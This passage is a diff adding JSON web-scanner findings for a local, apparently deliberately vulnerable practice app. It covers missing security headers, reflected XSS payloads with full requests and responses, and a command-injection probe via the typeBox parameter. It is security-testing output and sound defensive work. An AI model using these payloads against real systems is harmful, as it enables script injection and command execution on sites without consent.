@@ -1,0 +1,2104 @@
+{
+  "www_Resources_hmb_png": {
+    "nuclei": {},
+    "wapiti": {
+      "Clickjacking Protection": [
+        {
+          "path": "/www/Resources/hmb.png",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/Resources/hmb.png\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/Resources/hmb.png",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/Resources/hmb.png\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ]
+    }
+  },
+  "www_FileUpload_fileupload2_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/FileUpload/fileupload2.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/FileUpload/fileupload2.php",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload2.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/FileUpload/fileupload2.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload2.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/FileUpload/fileupload2.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload2.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/FileUpload/fileupload2.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload2.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/FileUpload/fileupload2.php",
+          "info": "Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://localhost:9991/www/FileUpload/fileupload2.php. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload2.php\" -e \"http://localhost:9991/www/FileUpload/fileupload2.php\" -F \"submit=Submit\" -F \"file=@your_local_file;filename=pix.gif\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_XSS_xssmainpage_html": {
+    "nuclei": {
+      "cve": [],
+      "sql": [],
+      "xss": []
+    },
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/XSS/xssmainpage.html",
+          "info": "CSP is not set for URL: http://localhost:9991/www/XSS/xssmainpage.html",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/xssmainpage.html\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/XSS/xssmainpage.html",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/xssmainpage.html\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/XSS/xssmainpage.html",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/xssmainpage.html\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/XSS/xssmainpage.html",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/xssmainpage.html\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_CommandExecution_CommandExec-4_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/CommandExecution/CommandExec-4.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/CommandExecution/CommandExec-4.php",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-4.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Command execution": [
+        {
+          "path": "/www/CommandExecution/CommandExec-4.php",
+          "info": "Command execution via injection in the parameter typeBox",
+          "parameter": "typeBox",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-4.php?typeBox=id\" -e \"http://localhost:9991/www/CommandExecution/CommandExec-4.php\"",
+          "wstg": [
+            "WSTG-INPV-12"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/CommandExecution/CommandExec-4.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-4.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/CommandExecution/CommandExec-4.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-4.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/CommandExecution/CommandExec-4.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-4.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/CommandExecution/CommandExec-4.php",
+          "info": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://localhost:9991/www/CommandExecution/CommandExec-4.php?typeBox=default. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-4.php?typeBox=default\" -e \"http://localhost:9991/www/CommandExecution/CommandExec-4.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_XSS_XSS_level3_php": {
+    "nuclei": {
+      "sql": [],
+      "xss": [
+        {
+          "info": {
+            "name": "Fuzzing Parameters - Cross-Site Scripting",
+            "description": "Cross-site scripting was discovered via a search for reflected parameter values in the server response via GET-requests.\n",
+            "impact": "N/A",
+            "severity": "medium",
+            "classification": {
+              "cve-id": []
+            }
+          },
+          "matched-at": "http://localhost:9991/www/XSS/XSS_level3.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E",
+          "request": "GET /www/XSS/XSS_level3.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E HTTP/1.1\r\nHost: localhost:9991\r\nUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+          "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 671\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Sun, 02 Nov 2025 09:51:10 GMT\r\nServer: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3\r\nX-Powered-By: PHP/5.6.21\r\n\r\n<!DOCTYPE html>\n<html>\n<head>\n\t<title>XSS 3</title>\n<link rel=\"shortcut icon\" href=\"../Resources/hmbct.png\" />\n</head>\n<body>\n\t\n\t <div style=\"background-color:#c9c9c9;padding:15px;\">\n      <button type=\"button\" name=\"homeButton\" onclick=\"location.href='../homepage.html';\">Home Page</button>\n      <button type=\"button\" name=\"mainButton\" onclick=\"location.href='xssmainpage.html';\">Main Page</button>\n    </div>\n<div align=\"center\">\n<form method=\"GET\" action=\"\" name=\"form\">\n   <p>Your name:<input type=\"text\" name=\"username\"></p>\n   <input type=\"submit\" name=\"submit\" value=\"Submit\">\n</form>\n\t</div>\nYour name is '>\"<svg/onload=confirm('xss-username')>\n\n</body>\n</html>\n",
+          "ip": "127.0.0.1",
+          "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (X11; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0' 'http://localhost:9991/www/XSS/XSS_level3.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E'"
+        }
+      ],
+      "cve": []
+    },
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/XSS/XSS_level3.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/XSS/XSS_level3.php",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level3.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/XSS/XSS_level3.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level3.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/XSS/XSS_level3.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level3.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/XSS/XSS_level3.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level3.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/XSS/XSS_level3.php",
+          "info": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://localhost:9991/www/XSS/XSS_level3.php?username=alice&submit=Submit. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level3.php?username=alice&submit=Submit\" -e \"http://localhost:9991/www/XSS/XSS_level3.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ],
+      "Reflected Cross Site Scripting": [
+        {
+          "path": "/www/XSS/XSS_level3.php",
+          "info": "Reflected Cross Site Scripting vulnerability found via injection in the parameter username",
+          "parameter": "username",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level3.php?username=%3CSvG%2FoNloAd%3Dalert%28%2Fwjzutd3jl4%2F%29%3E&submit=Submit\" -e \"http://localhost:9991/www/XSS/XSS_level3.php\"",
+          "wstg": [
+            "WSTG-INPV-01"
+          ]
+        }
+      ]
+    }
+  },
+  "www_SQL_sql2_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/SQL/sql2.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/SQL/sql2.php",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql2.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/SQL/sql2.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql2.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/SQL/sql2.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql2.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/SQL/sql2.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql2.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/SQL/sql2.php",
+          "info": "Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://localhost:9991/www/SQL/sql2.php. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql2.php\" -e \"http://localhost:9991/www/SQL/sql2.php\" -d \"number=default&submit=Submit\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ],
+      "Reflected Cross Site Scripting": [
+        {
+          "path": "/www/SQL/sql2.php",
+          "info": "Reflected Cross Site Scripting vulnerability found via injection in the parameter number",
+          "parameter": "number",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql2.php\" -e \"http://localhost:9991/www/SQL/sql2.php\" -d \"number=%3CScRiPt%3Ealert%28%27wbpgmlo9c8%27%29%3C%2FsCrIpT%3E&submit=Submit\"",
+          "wstg": [
+            "WSTG-INPV-01"
+          ]
+        }
+      ]
+    }
+  },
+  "www_XSS_XSS_level1_php": {
+    "nuclei": {
+      "xss": [
+        {
+          "info": {
+            "name": "Fuzzing Parameters - Cross-Site Scripting",
+            "description": "Cross-site scripting was discovered via a search for reflected parameter values in the server response via GET-requests.\n",
+            "impact": "N/A",
+            "severity": "medium",
+            "classification": {
+              "cve-id": []
+            }
+          },
+          "matched-at": "http://localhost:9991/www/XSS/XSS_level1.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E",
+          "request": "GET /www/XSS/XSS_level1.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E HTTP/1.1\r\nHost: localhost:9991\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/105.0 Safari/537.36\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+          "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 674\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Sun, 02 Nov 2025 09:51:10 GMT\r\nServer: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3\r\nX-Powered-By: PHP/5.6.21\r\n\r\n<!DOCTYPE html>\n<html>\n<head>\n   <title>XSS 1</title>\n<link rel=\"shortcut icon\" href=\"../Resources/hmbct.png\" />\n</head>\n<body>\n\t\n\t <div style=\"background-color:#c9c9c9;padding:15px;\">\n      <button type=\"button\" name=\"homeButton\" onclick=\"location.href='../homepage.html';\">Home Page</button>\n      <button type=\"button\" name=\"mainButton\" onclick=\"location.href='xssmainpage.html';\">Main Page</button>\n    </div>\n<div align=\"center\">\n   <form method=\"GET\" action=\"\" name=\"form\">\n   <p>Your name:<input type=\"text\" name=\"username\"></p>\n   <input type=\"submit\" name=\"submit\" value=\"Submit\">\n</form>\n\t</div>\nYour name is '>\"<svg/onload=confirm('xss-username')></body>\n</html>\n",
+          "ip": "127.0.0.1",
+          "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/105.0 Safari/537.36' 'http://localhost:9991/www/XSS/XSS_level1.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E'"
+        },
+        {
+          "info": {
+            "name": "Django Debug Page - Cross-Site Scripting",
+            "description": "Django 1.10.x before 1.10.8 and 1.11.x before 1.11.5 has HTML autoescaping disabled in a portion of the template for the technical 500 debug page. We detected that right circumstances (DEBUG=True) are present to allow a cross-site scripting attack.\n",
+            "impact": "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to potential session hijacking, defacement, or theft of sensitive information.\n",
+            "severity": "medium",
+            "classification": {
+              "cve-id": [
+                "cve-2017-12794"
+              ]
+            }
+          },
+          "matched-at": "http://localhost:9991/www/XSS/XSS_level1.php/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E",
+          "request": "GET /www/XSS/XSS_level1.php/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1\r\nHost: localhost:9991\r\nUser-Agent: Mozilla/5.0 (Fedora; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+          "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 674\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Sun, 02 Nov 2025 09:51:13 GMT\r\nServer: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3\r\nX-Powered-By: PHP/5.6.21\r\n\r\n<!DOCTYPE html>\n<html>\n<head>\n   <title>XSS 1</title>\n<link rel=\"shortcut icon\" href=\"../Resources/hmbct.png\" />\n</head>\n<body>\n\t\n\t <div style=\"background-color:#c9c9c9;padding:15px;\">\n      <button type=\"button\" name=\"homeButton\" onclick=\"location.href='../homepage.html';\">Home Page</button>\n      <button type=\"button\" name=\"mainButton\" onclick=\"location.href='xssmainpage.html';\">Main Page</button>\n    </div>\n<div align=\"center\">\n   <form method=\"GET\" action=\"\" name=\"form\">\n   <p>Your name:<input type=\"text\" name=\"username\"></p>\n   <input type=\"submit\" name=\"submit\" value=\"Submit\">\n</form>\n\t</div>\nYour name is <script>alert(document.domain)</script></body>\n</html>\n",
+          "ip": "127.0.0.1",
+          "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Fedora; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0' 'http://localhost:9991/www/XSS/XSS_level1.php/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E'"
+        }
+      ],
+      "sql": [],
+      "cve": [
+        {
+          "info": {
+            "name": "Django Debug Page - Cross-Site Scripting",
+            "description": "Django 1.10.x before 1.10.8 and 1.11.x before 1.11.5 has HTML autoescaping disabled in a portion of the template for the technical 500 debug page. We detected that right circumstances (DEBUG=True) are present to allow a cross-site scripting attack.\n",
+            "impact": "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to potential session hijacking, defacement, or theft of sensitive information.\n",
+            "severity": "medium",
+            "classification": {
+              "cve-id": [
+                "cve-2017-12794"
+              ]
+            }
+          },
+          "matched-at": "http://localhost:9991/www/XSS/XSS_level1.php/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E",
+          "request": "GET /www/XSS/XSS_level1.php/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1\r\nHost: localhost:9991\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+          "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 674\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Sun, 02 Nov 2025 09:51:41 GMT\r\nServer: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3\r\nX-Powered-By: PHP/5.6.21\r\n\r\n<!DOCTYPE html>\n<html>\n<head>\n   <title>XSS 1</title>\n<link rel=\"shortcut icon\" href=\"../Resources/hmbct.png\" />\n</head>\n<body>\n\t\n\t <div style=\"background-color:#c9c9c9;padding:15px;\">\n      <button type=\"button\" name=\"homeButton\" onclick=\"location.href='../homepage.html';\">Home Page</button>\n      <button type=\"button\" name=\"mainButton\" onclick=\"location.href='xssmainpage.html';\">Main Page</button>\n    </div>\n<div align=\"center\">\n   <form method=\"GET\" action=\"\" name=\"form\">\n   <p>Your name:<input type=\"text\" name=\"username\"></p>\n   <input type=\"submit\" name=\"submit\" value=\"Submit\">\n</form>\n\t</div>\nYour name is <script>alert(document.domain)</script></body>\n</html>\n",
+          "ip": "127.0.0.1",
+          "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15' 'http://localhost:9991/www/XSS/XSS_level1.php/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E'"
+        }
+      ]
+    },
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/XSS/XSS_level1.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/XSS/XSS_level1.php",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level1.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/XSS/XSS_level1.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level1.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/XSS/XSS_level1.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level1.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/XSS/XSS_level1.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level1.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/XSS/XSS_level1.php",
+          "info": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://localhost:9991/www/XSS/XSS_level1.php?username=alice&submit=Submit. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level1.php?username=alice&submit=Submit\" -e \"http://localhost:9991/www/XSS/XSS_level1.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ],
+      "Reflected Cross Site Scripting": [
+        {
+          "path": "/www/XSS/XSS_level1.php",
+          "info": "Reflected Cross Site Scripting vulnerability found via injection in the parameter username",
+          "parameter": "username",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level1.php?username=%3CScRiPt%3Ealert%28%27wd134b29th%27%29%3C%2FsCrIpT%3E&submit=Submit\" -e \"http://localhost:9991/www/XSS/XSS_level1.php\"",
+          "wstg": [
+            "WSTG-INPV-01"
+          ]
+        }
+      ]
+    }
+  },
+  "www_XSS_XSS_level5_php": {
+    "nuclei": {
+      "sql": [],
+      "cve": [],
+      "xss": [
+        {
+          "info": {
+            "name": "Basic XSS Prober - Cross-Site Scripting",
+            "description": "A cross-site scripting vulnerability was discovered via generic testing. Manual testing is needed to verify exploitation.",
+            "impact": "N/A",
+            "severity": "low",
+            "classification": {
+              "cve-id": []
+            }
+          },
+          "matched-at": "http://localhost:9991/www/XSS/XSS_level5.php/%61%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e",
